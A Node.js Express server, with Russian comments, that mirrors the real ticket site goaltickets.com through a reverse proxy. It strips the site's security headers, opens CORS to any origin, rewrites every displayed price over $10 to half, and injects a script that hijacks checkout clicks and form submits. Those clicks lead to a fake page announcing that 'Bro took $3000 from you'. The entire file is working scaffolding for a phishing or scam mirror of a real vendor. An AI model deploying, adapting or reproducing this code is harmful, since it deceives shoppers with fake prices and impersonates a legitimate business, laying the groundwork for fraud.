const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 8080;
const VERSION = '6.0.0'; // Финальная версия

// Middleware
app.use(cors({
  origin: true,
  credentials: true
}));

// Увеличиваем лимит для больших HTML страниц
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Логирование
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// 🎯 ПЕРЕХВАТ CHECKOUT - ПОКАЗЫВАЕМ НАШУ СТРАНИЦУ
app.get('/checkout*', (req, res) => {
  console.log('🎯 Checkout intercepted:', req.url);
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Checkout - GoalTickets</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0; padding: 0; min-height: 100vh;
                display: flex; align-items: center; justify-content: center;
            }
            .container {
                background: white; padding: 50px; border-radius: 20px;
                text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            }
            h1 { color: #ff6b6b; font-size: 3em; margin-bottom: 30px; }
            .message { font-size: 1.5em; color: #333; margin-bottom: 30px; }
            .back-btn { 
                background: #667eea; color: white; padding: 15px 30px;
                border: none; border-radius: 10px; font-size: 1.2em;
                cursor: pointer; text-decoration: none; display: inline-block;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 ПЕРЕХВАЧЕНО!</h1>
            <div class="message">БратЦ снял с тебя 3000$</div>
            <a href="/" class="back-btn">← Вернуться на сайт</a>
        </div>
    </body>
    </html>
  `);
});

app.get('/cart', (req, res) => {
  console.log('🎯 Cart page intercepted:', req.url);
  res.redirect('/checkout');
});

// Настройка прокси
const proxyOptions = {
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  timeout: 30000,
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Cache-Control', 'no-cache');
  },
  onProxyRes: (proxyRes, req, res) => {
    // Удаляем проблемные заголовки
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['x-content-type-options'];
    delete proxyRes.headers['referrer-policy'];
    delete proxyRes.headers['strict-transport-security'];
    
    // Добавляем CORS
    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
    proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
    proxyRes.headers['X-Proxy-Version'] = VERSION;
    
    // Перехватываем HTML для изменения цен
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      proxyRes.on('end', () => {
        let modifiedBody = body;
        console.log('💰 Starting price modification...');
        
        // Изменяем цены в 2 раза
        const pricePatterns = [
          { pattern: /From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: 'From $', suffix: ' USD' },
          { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '$', suffix: ' USD' },
          { pattern: /USD\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD $', suffix: '' },
          { pattern: /USD\s+(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD ', suffix: '' },
          { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '', suffix: ' USD' },
          { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' }
        ];
        
        pricePatterns.forEach(({ pattern, prefix, suffix }) => {
          modifiedBody = modifiedBody.replace(pattern, (match, price) => {
            const cleanPrice = price.replace(/,/g, '');
            const originalPrice = parseFloat(cleanPrice);
            if (!isNaN(originalPrice) && originalPrice > 10) {
              const newPrice = Math.round(originalPrice / 2 * 100) / 100;
              const formattedPrice = newPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
              console.log(`💰 Price changed: ${prefix}${price}${suffix} -> ${prefix}${formattedPrice}${suffix}`);
              return match.replace(price, formattedPrice);
            }
            return match;
          });
        });
        
        // Добавляем JavaScript для перехвата checkout
        const checkoutScript = `
          <script>
            console.log('🎯 Checkout Interceptor v${VERSION} loaded');
            
            function interceptCheckout() {
              document.addEventListener('click', function(event) {
                const target = event.target;
                const text = target.textContent?.toLowerCase() || '';
                const href = target.href || '';
                const form = target.closest('form');
                
                if (text.includes('checkout') || text.includes('купить') || 
                    text.includes('оформить') || href.includes('checkout') ||
                    target.classList.contains('checkout') || target.id.includes('checkout') ||
                    (form && form.action && form.action.includes('cart')) ||
                    href.includes('goaltickets.com/checkout') ||
                    href.includes('goaltickets.com/cart') ||
                    (href && (href.includes('/checkout') || href.includes('/cart')))) {
                  
                  console.log('🎯 Checkout button clicked:', target);
                  event.preventDefault();
                  event.stopPropagation();
                  
                  const notification = document.createElement('div');
                  notification.innerHTML = \`
                    <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                      Перенаправляем на checkout...
                    </div>
                  \`;
                  document.body.appendChild(notification);
                  
                  setTimeout(() => {
                    window.location.href = '/checkout';
                  }, 500);
                  
                  return false;
                }
              });
              
              document.addEventListener('submit', function(event) {
                const form = event.target;
                const action = form.action?.toLowerCase() || '';
                
                if (action.includes('checkout')) {
                  console.log('🎯 Checkout form submission intercepted:', form);
                  event.preventDefault();
                  event.stopPropagation();
                  
                  const notification = document.createElement('div');
                  notification.innerHTML = \`
                    <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                      Обрабатываем заказ...
                    </div>
                  \`;
                  document.body.appendChild(notification);
                  
                  setTimeout(() => {
                    window.location.href = '/checkout';
                  }, 1000);
                  
                  return false;
                }
              });
            }
            
            if (document.readyState === 'loading') {
              document.addEventListener('DOMContentLoaded', interceptCheckout);
            } else {
              interceptCheckout();
            }
            
            setTimeout(interceptCheckout, 2000);
          </script>
        `;
        
        modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
        
        if (!res.headersSent) {
          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
          res.end(modifiedBody);
        }
      });
      return;
    }
    
    if (!res.headersSent) {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    }
  },
  onError: (err, req, res) => {
    console.error('Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(500).send('Service temporarily unavailable');
    }
  }
};

// Применяем прокси ко всем GET запросам
app.get('/', createProxyMiddleware(proxyOptions));
app.get('*', createProxyMiddleware(proxyOptions));

// Обработка ошибок
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 FULL PROXY v${VERSION} running on port ${PORT}`);
  console.log(`📡 Proxying ALL requests to: https://goaltickets.com`);
  console.log(`🌐 Access your proxy at: http://localhost:${PORT}`);
});